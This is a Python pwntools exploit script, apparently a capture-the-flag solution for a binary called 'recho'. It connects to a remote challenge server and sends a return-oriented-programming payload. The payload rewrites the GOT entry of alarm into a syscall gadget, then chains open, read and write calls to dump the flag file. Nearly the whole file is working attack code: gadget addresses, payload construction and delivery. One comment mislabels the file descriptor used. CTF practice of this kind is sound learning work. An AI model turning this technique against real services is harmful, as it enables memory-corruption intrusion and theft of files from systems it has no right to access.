#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal <edit py/.vimrc to change me>

from pwn import *
context.log_level="debug"
pwn_file="./recho"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.198.29.45", 47332)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

pop_rax = 0x00000000004006fc
pop_rdi = 0x00000000004008a3
pop_rsi_r15 = 0x00000000004008a1
pop_rdx = 0x00000000004006fe
add_rdi = 0x000000000040070d

flag = 0x601058
bss = 0x601800

debug()

r.recvline()
r.sendline('1000')

sh = 'a'*0x30 + p64(0)                      # change elf.got['alarm'] to syscall
sh += p64(pop_rdi) + p64(elf.got['alarm'])
sh += p64(pop_rax) + p64(0x5)
sh += p64(add_rdi)

sh += p64(pop_rdi) + p64(flag)              # open("flag")
sh += p64(pop_rsi_r15) + p64(0)*2
sh += p64(pop_rdx) + p64(0)
sh += p64(pop_rax) + p64(2)
sh += p64(elf.plt['alarm'])

sh += p64(pop_rdi) + p64(3)                 # read(2, flag, 0x100)
sh += p64(pop_rsi_r15) + p64(bss) + p64(0)
sh += p64(pop_rdx) + p64(0x100)
sh += p64(pop_rax) + p64(0)
sh += p64(elf.plt['alarm'])

sh += p64(pop_rdi) + p64(1)                 # write(1, flag, 0x100)
sh += p64(pop_rsi_r15) + p64(bss) + p64(0)
sh += p64(pop_rdx) + p64(0x100)
sh += p64(pop_rax) + p64(1)
sh += p64(elf.plt['alarm'])


r.sendline(sh)

r.shutdown('send')                          # trick eof

r.interactive()
